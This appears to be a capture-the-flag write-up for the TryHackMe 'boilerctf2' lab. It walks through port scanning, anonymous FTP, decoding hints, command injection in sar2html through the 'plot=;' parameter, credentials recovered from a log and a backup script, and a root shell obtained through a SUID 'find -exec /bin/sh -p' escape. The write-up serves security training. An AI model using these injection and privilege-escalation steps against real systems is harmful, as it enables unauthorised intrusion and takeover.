https://tryhackme.com/r/room/boilerctf2
# IP
```IP
10.10.114.248
```
# NMAP
```bash
nmap -p- -T4 nmap_ports 10.10.114.248 -v
21/tcp    open     ftp
80/tcp    open     http
1248/tcp  filtered hermes
8657/tcp  filtered unknown
9007/tcp  filtered ogs-client
10000,10180,11525,12207,12370,12475,18591,18667,19492,28035,39301,44960,46645,55007,57961,59449,60395,64788


nmap -sV -sC -p21,80,1248,657,9007,10000,10180,11525,12207,12370,12475,18591,18667,19492,28035,39301,44960,46645,55007,57961,59449,60395,64788 -oN nmap_services 10.10.114.248 -v
21/tcp    open   ftp        vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.97.245
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp    open   http       Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Apache2 Ubuntu Default Page: It works
657/tcp   closed rmc
1248/tcp  closed hermes
9007/tcp  closed ogs-client
10000/tcp open   http       MiniServ 1.930 (Webmin httpd)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesnt have a title (text/html; Charset=iso-8859-1).
|_http-favicon: Unknown favicon MD5: A1DD58E2564E83F72259D859658123E9
10180/tcp closed unknown
11525/tcp closed unknown
12207/tcp closed unknown
12370/tcp closed unknown
12475/tcp closed unknown
18591/tcp closed unknown
18667/tcp closed unknown
19492/tcp closed unknown
28035/tcp closed unknown
39301/tcp closed unknown
44960/tcp closed unknown
46645/tcp closed unknown
55007/tcp open   ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
|_  256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
57961/tcp closed unknown
59449/tcp closed unknown
60395/tcp closed unknown
64788/tcp closed unknown

```
# FTP
allows **anon** login, and there is a hidden file
```bash
ftp 10.10.114.248
Connected to 10.10.114.248.
220 (vsFTPd 3.0.3)
Name (10.10.114.248:kali): Anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||42938|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -la
229 Entering Extended Passive Mode (|||47649|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
226 Directory send OK.
ftp> get .info.txt
local: .info.txt remote: .info.txt
229 Entering Extended Passive Mode (|||47745|)
150 Opening BINARY mode data connection for .info.txt (74 bytes).
100% |*************************************************************************************************************************|    74      163.86 KiB/s    00:00 ETA
226 Transfer complete.
74 bytes received in 00:00 (0.69 KiB/s)

cat .info.txt 
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
```
https://www.dcode.fr/vigenere-cipher will crack it with key `N`
and it says `Just wanted to see if you find it. Lol. Remember: Enumeration is the key!`
`webmin` is also up to date
# Web
let's check `http://10.10.114.248/robots.txt`
```
User-agent: *
Disallow: /

/tmp
/.ssh
/yellow
/not
/a+rabbit
/hole
/or
/is
/it

079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075
```
last one give `OTliMDY2MGNkOTVhZGVhMzI3YzU0MTgyYmFhNTE1ODQK` from ascii.
and from base64 `99b0660cd95adea327c54182baa51584` it is a hash and from https://crackstation.net/ you will get that it is `kidding`.

```bash
dirb http://10.10.114.248/  
```
gives us `/joomla` CMS

`http://10.10.114.248/joomla//administrator/manifests/files/joomla.xml` says that the version is `3.9.12`.

```bash
dirb http://10.10.114.248/joomla/ 
```
it will give `/_test` directory

# File Upload
`/_test` has `sar2html` which is vulnerable to RCE. `/index.php?plot=;<command>`, then click select host. 
https://www.exploit-db.com/exploits/47204

`/index.php?plot=;cat log.txt` will give us:
`Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@$$`

# User flag
`basterd:superduperp@$$`
ssh to port 55007
```bash
$ cat backup.sh
REMOTE=1.2.3.4

SOURCE=/home/stoner
TARGET=/usr/local/backup

LOG=/home/stoner/bck.log
 
DATE=`date +%y\.%m\.%d\.`

USER=stoner
#superduperp@$$no1knows

ssh $USER@$REMOTE mkdir $TARGET/$DATE


if [ -d "$SOURCE" ]; then
    for i in `ls $SOURCE | grep 'data'`;do
             echo "Begining copy of" $i  >> $LOG
             scp  $SOURCE/$i $USER@$REMOTE:$TARGET/$DATE
             echo $i "completed" >> $LOG

                if [ -n `ssh $USER@$REMOTE ls $TARGET/$DATE/$i 2>/dev/null` ];then
                    rm $SOURCE/$i
                    echo $i "removed" >> $LOG
                    echo "####################" >> $LOG
                                else
                                        echo "Copy not complete" >> $LOG
                                        exit 0
                fi 
    done
     

else

    echo "Directory is not present" >> $LOG
    exit 0
fi

```

switch user to `stoner:superduperp@$$no1knows`
```bash
stoner@Vulnerable:~$ cat .secret
You made it till here, well done.
```

# PrivEsc
```
stoner@Vulnerable:~$ sudo -l
User stoner may run the following commands on Vulnerable:
    (root) NOPASSWD: /NotThisTime/MessinWithYa
```
but there is no such thing

```bash
find / -perm -4000 2>/dev/null
# find

find . -exec /bin/sh -p \; -quit
```

and flag
```bash
cat /root/root.txt
It wasn't that hard, was it?
```